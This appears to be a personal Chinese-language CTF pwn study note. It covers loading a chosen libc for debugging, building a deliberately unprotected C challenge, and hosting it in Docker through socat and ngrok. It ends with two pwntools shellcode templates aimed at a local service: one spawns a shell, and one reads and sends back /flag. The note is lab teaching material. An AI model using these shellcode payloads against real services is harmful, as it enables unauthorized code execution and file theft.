# [个人] 零基础的二进制漏洞笔记



# GDB加载指定Libc

## 工具准备

```shell
sudo wget https://github.com/io12/pwninit/releases/download/3.3.0/pwninit -O /usr/local/bin/pwninit
sudo chmod +x /usr/local/bin/pwninit
```

## 下载ld

```shell
sudo cp libc* /home/kali/Desktop/ctf/debug
pwninit --bin pwn --libc /home/kali/Desktop/ctf/debug/libc-*
pwninit --bin pwn --libc /home/kali/Desktop/ctf/debug/libc.*
sudo cp ld* /home/kali/Desktop/ctf/debug
```

## 指定Libc

```shell
patchelf --set-interpreter /home/kali/Desktop/ctf/debug/ld* pwn
patchelf --set-rpath /home/kali/Desktop/ctf/debug pwn
```

## 查看Libc

```shell
readelf -l pwn | grep -A1 INTERP
readelf -d pwn | grep RUNPATH
```

```shell
ldd pwn
```

## 老手一键连招(无符号文件)

```shell
sudo cp libc* /home/kali/Desktop/ctf/debug
pwninit --bin pwn --libc /home/kali/Desktop/ctf/debug/libc-*
pwninit --bin pwn --libc /home/kali/Desktop/ctf/debug/libc.*
sudo cp ld* /home/kali/Desktop/ctf/debug
patchelf --set-interpreter /home/kali/Desktop/ctf/debug/ld* pwn
patchelf --set-rpath /home/kali/Desktop/ctf/debug pwn
ldd pwn
```

## 老手一键连招(有符号文件)

```shell
sudo cp libc* /home/kali/Desktop/ctf/debug
sudo cp ld* /home/kali/Desktop/ctf/debug
patchelf --set-interpreter /home/kali/Desktop/ctf/debug/ld* pwn
patchelf --set-rpath /home/kali/Desktop/ctf/debug pwn
ldd pwn
```



# 出题目

## 编写题目

编写文件`pwn.c`

```c
#include <stdlib.h>

int main() {
    return 0;
}
```

## **编译题目**

编译文件`pwn.c` -> `pwn.exe` | `pwn`

```shell
gcc -g -std=c90 -fno-stack-protector -no-pie pwn.c -o pwn
```

## 下载docker

```shell
sudo apt-get update
sudo apt-get install apt-transport-https ca-certificates curl software-properties-common
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt-get update
sudo apt-get install docker-ce docker-ce-cli containerd.io
```

## 配置docker

```shell
cat /etc/os-release 
PRETTY_NAME="Ubuntu 22.04.1 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.1 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```

## 启动docker

### 下载容器

```shell
sudo docker run -it --name ubuntu-linux-pwn-ctf ubuntu:latest /bin/bash
```

### 启动容器

```shell
sudo docker ps -a
```

```shell
CONTAINER ID   IMAGE           COMMAND       CREATED        STATUS          PORTS     NAMES
1e771be0d529   ubuntu:latest   "/bin/bash"   26 hours ago   Up 35 minutes             ubuntu-linux-pwn-ctf
```

```shell
sudo docker start ubuntu-linux-pwn-ctf
sudo docker exec -it ubuntu-linux-pwn-ctf /bin/bash
```

## docker容器内下载wget

```shell
apt update
apt install -y wget unzip
```

## docker容器内下载ngrok

```shell
mkdir -p /ngrok && cd /ngrok
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -zxvf ngrok-v3-stable-linux-amd64.tgz
```

## 拷贝题目到docker容器内

```shell
mkdir /pwn
sudo docker cp pwn ubuntu-linux-pwn-ctf:/pwn
chmod +x /pwn/pwn
```

## docker容器内添加flag

```shell
at > /pwn/flag << EOF
flag{probie}
EOF
```

## docker容器内开放端口

```shell
cd /pwn
nohup socat TCP-LISTEN:9999,fork,reuseaddr EXEC:/pwn/pwn > pwn/pwn.log 2>&1 &
cd /ngrok
./ngrok tcp 9999
```

## docker容器内下载netcat

```shell
apt install -y socat netcat-traditional net-tools
```

## docker容器内测试连接

```shell
nc localhost 9999
```

```shell
nc 0.tcp.jp.ngrok.io 11402
```



# PWN库中的ShellCode模板使用

## 跳转到真实物理地址

```python
from pwn import *

context(os="linux", arch="amd64")

r = remote("localhost", 8080)

payload = asm(shellcraft.sh())
payload += p64(backdoor_elf_addr)

r.sendlineafter("> \n".encode(), payload)

r.interactive()
```

## 获取指定文件的内容

```python
from pwn import *

context(os="linux", arch="amd64")

r = remote("localhost", 8080)

shellcode = shellcraft.openat(0, "/flag", 0)
shellcode += shellcraft.sendfile(1, 3, 0, 0x100)

payload = asm(shellcode)

r.sendlineafter("> \n".encode(), payload)

r.interactive()
```